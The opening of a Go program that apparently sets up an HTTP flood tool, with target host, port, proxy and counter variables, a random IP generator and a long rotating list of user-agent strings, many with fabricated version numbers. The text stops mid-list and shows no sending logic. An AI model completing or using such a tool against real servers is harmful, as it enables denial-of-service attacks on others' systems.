package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

var (
	host      string
	port      string
	page      string
	method    string
	key       string
	start     = make(chan bool)
	sentCount uint64
	errCount  uint64
	proxies   []string
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

// Generate a valid random IPv4 address
func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

// Random User-Agent from list
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/118.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) Firefox/117.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
	"Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/20100101 Firefox/109.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/886.2.39 (KHTML, like Gecko) Version/14.0 Safari/886.2.39",
    "Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4622.167 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4204.149 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/938.4.6 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/938.4.6",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/942.4.14 (KHTML, like Gecko) Version/14.0 Safari/942.4.14",
    "Mozilla/5.0 (Linux; Android 10; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4564.157 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0",
    "Mozilla/5.0 (Linux; Android 9; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.4795.183 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/885.4.50 (KHTML, like Gecko) Version/17.0 Safari/885.4.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/106.0.4879.140 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/101.0.3482.45 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Vivo V21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5942.123 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/794.1.26 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/794.1.26",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/113.0.2150.17 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4566.122 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/112.0.5628.123 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/830.5.1 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/830.5.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/638.5.10 (KHTML, like Gecko) Version/15.0 Safari/638.5.10",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Edg/114.0.2139.39 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.5771.154 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.3.41 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/602.3.41",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/854.3.41 (KHTML, like Gecko) Version/17.0 Safari/854.3.41",
    "Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5145.180 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/691.1.10 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/691.1.10",
    "Mozilla/5.0 (Linux; Android 7; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4087.101 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/905.5.37 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/905.5.37",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/609.5.43 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/609.5.43",
    "Mozilla/5.0 (Linux; Android 12; Vivo V21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4005.132 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/94.0.4433.153 Safari/537.36",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/838.2.50 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/838.2.50",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5162.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0",
    "Mozilla/5.0 (Linux; Android 15; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4918.174 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Linux; Android 7; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4435.142 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/793.3.40 (KHTML, like Gecko) Version/13.0 Safari/793.3.40",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/754.4.5 (KHTML, like Gecko) Version/13.0 Safari/754.4.5",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/814.3.42 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/814.3.42",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
    "Mozilla/5.0 (Linux; Android 13; Vivo V21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.4210.166 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0",
    "Mozilla/5.0 (Linux; Android 15; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4059.184 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5266.179 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.5487.168 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.5387.195 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/735.1.5 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/735.1.5",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/631.3.18 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/631.3.18",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/773.1.13 (KHTML, like Gecko) Version/17.0 Safari/773.1.13",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/785.4.16 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/785.4.16",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/800.4.42 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/800.4.42",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.5266.199 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/764.5.48 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/764.5.48",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/643.1.24 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/643.1.24",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.5301.172 Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/637.5.46 (KHTML, like Gecko) Version/13.0 Safari/637.5.46",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/920.3.19 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/920.3.19",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/678.1.3 (KHTML, like Gecko) Version/14.0 Safari/678.1.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/619.1.30 (KHTML, like Gecko) Version/17.0 Safari/619.1.30",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0",
    "Mozilla/5.0 (Linux; Android 13; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4768.182 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/993.4.38 (KHTML, like Gecko) Version/13.0 Safari/993.4.38",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.5295.189 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/991.1.24 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/991.1.24",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/734.5.7 (KHTML, like Gecko) Version/15.0 Safari/734.5.7",
    "Mozilla/5.0 (Linux; Android 13; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.4681.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/860.4.10 (KHTML, like Gecko) Version/16.0 Safari/860.4.10",
    "Mozilla/5.0 (Linux; Android 7; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.5477.164 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/878.5.40 (KHTML, like Gecko) Version/15.0 Safari/878.5.40",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Edg/116.0.2573.160 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/91.0.2928.131 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/979.4.2 (KHTML, like Gecko) Version/13.0 Safari/979.4.2",
    "Mozilla/5.0 (Linux; Android 13; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5651.188 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.5316.184 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5921.175 Safari/537.36",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/87.0.5655.132 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5168.170 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/103.0.5464.154 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/877.1.10 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/877.1.10",
    "Mozilla/5.0 (Linux; Android 12; RMX3686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4637.193 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/619.4.48 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/619.4.48",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/645.5.25 (KHTML, like Gecko) Version/17.0 Safari/645.5.25",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/640.1.41 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/640.1.41",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/785.5.14 (KHTML, like Gecko) Version/17.0 Safari/785.5.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/722.5.39 (KHTML, like Gecko) Version/14.0 Safari/722.5.39",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/700.3.32 (KHTML, like Gecko) Version/14.0 Safari/700.3.32",
    "Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4771.139 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.4501.178 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/105.0.4194.161 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/941.3.31 (KHTML, like Gecko) Version/15.0 Safari/941.3.31",
    "Mozilla/5.0 (Linux; Android 9; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.5741.185 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/728.4.13 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/728.4.13",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4992.163 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.5967.179 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/107.0.5212.188 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.4014.107 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5745.111 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/109.0.4342.157 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/909.1.21 (KHTML, like Gecko) Version/15.0 Safari/909.1.21",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/869.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/869.1.15",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.5276.164 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/996.5.12 (KHTML, like Gecko) Version/17.0 Safari/996.5.12",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/735.1.17 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/735.1.17",
    "Mozilla/5.0 (Linux; Android 8; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.5794.131 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Vivo V21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4100.125 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/114.0.5453.159 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5769.150 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/608.1.8 (KHTML, like Gecko) Version/15.0 Safari/608.1.8",
    "Mozilla/5.0 (Linux; Android 10; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5521.122 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/770.4.24 (KHTML, like Gecko) Version/16.0 Safari/770.4.24",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Edg/103.0.1958.174 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/619.1.13 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/619.1.13",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/758.4.24 (KHTML, like Gecko) Version/13.0 Safari/758.4.24",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/627.2.14 (KHTML, like Gecko) Version/16.0 Safari/627.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/765.3.9 (KHTML, like Gecko) Version/13.0 Safari/765.3.9",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:113.0) Gecko/20100101 Firefox/113.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/929.5.4 (KHTML, like Gecko) Version/16.0 Safari/929.5.4",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Edg/95.0.3135.174 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/848.2.6 (KHTML, like Gecko) Version/17.0 Safari/848.2.6",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/646.3.18 (KHTML, like Gecko) Version/17.0 Safari/646.3.18",
    "Mozilla/5.0 (Linux; Android 14; RMX3686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5843.150 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Edg/103.0.4998.148 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/650.1.46 (KHTML, like Gecko) Version/16.0 Safari/650.1.46",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.5779.100 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/97.0.5036.146 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5655.175 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/813.1.33 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/813.1.33",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/798.1.47 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/798.1.47",
    "Mozilla/5.0 (Linux; Android 9; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5355.142 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/84.0.5493.159 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/890.4.4 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/890.4.4",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/797.1.7 (KHTML, like Gecko) Version/14.0 Safari/797.1.7",
    "Mozilla/5.0 (Linux; Android 7; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4509.104 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/923.2.14 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/923.2.14",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/670.5.18 (KHTML, like Gecko) Version/17.0 Safari/670.5.18",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/765.4.22 (KHTML, like Gecko) Version/14.0 Safari/765.4.22",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/768.1.11 (KHTML, like Gecko) Version/14.0 Safari/768.1.11",
    "Mozilla/5.0 (Linux; Android 15; RMX3686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4840.193 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/852.2.28 (KHTML, like Gecko) Version/14.0 Safari/852.2.28",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/892.4.13 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/892.4.13",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/110.0.5674.165 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/885.4.19 (KHTML, like Gecko) Version/15.0 Safari/885.4.19",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/863.5.6 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/863.5.6",
    "Mozilla/5.0 (Linux; Android 8; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.5303.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5336.143 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/87.0.4109.170 Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.5856.135 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/929.3.15 (KHTML, like Gecko) Version/14.0 Safari/929.3.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/926.1.34 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/926.1.34",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/96.0.1278.192 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Edg/90.0.1742.169 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/939.1.18 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/939.1.18",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/960.1.6 (KHTML, like Gecko) Version/13.0 Safari/960.1.6",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/697.5.38 (KHTML, like Gecko) Version/16.0 Safari/697.5.38",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/931.5.26 (KHTML, like Gecko) Version/17.0 Safari/931.5.26",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/88.0.4055.139 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.5203.119 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/906.2.1 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/906.2.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/636.4.18 (KHTML, like Gecko) Version/14.0 Safari/636.4.18",
    "Mozilla/5.0 (Linux; Android 13; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5539.181 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/83.0.5089.152 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4592.113 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Edg/111.0.4417.121 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/980.1.22 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/980.1.22",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/751.5.11 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/751.5.11",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/89.0.5027.168 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/893.5.2 (KHTML, like Gecko) Version/13.0 Safari/893.5.2",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/676.5.26 (KHTML, like Gecko) Version/13.0 Safari/676.5.26",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/923.1.19 (KHTML, like Gecko) Version/15.0 Safari/923.1.19",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/994.2.40 (KHTML, like Gecko) Version/16.0 Safari/994.2.40",
